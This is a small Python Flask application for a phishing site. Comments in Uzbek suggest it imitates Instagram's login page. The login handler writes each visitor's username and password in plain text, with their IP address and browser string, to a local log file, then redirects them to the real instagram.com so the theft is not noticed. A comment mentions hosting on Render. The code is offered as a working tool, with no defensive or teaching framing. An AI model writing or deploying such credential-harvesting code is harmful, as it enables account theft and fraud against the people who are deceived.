from flask import Flask, request, redirect, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    username = request.form.get("username")
    password = request.form.get("password")

    with open("log.txt", "a") as log:
        log.write(f"{datetime.now()} - IP: {ip}, UA: {user_agent}, Username: {username}, Password: {password}\n")

    return redirect("https://instagram.com")  # Haqiqiy saytingga redirect

if __name__ == "__main__":
    app.run(debug=True)

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Render portni shu tarzda beradi
    app.run(host="0.0.0.0", port=port)
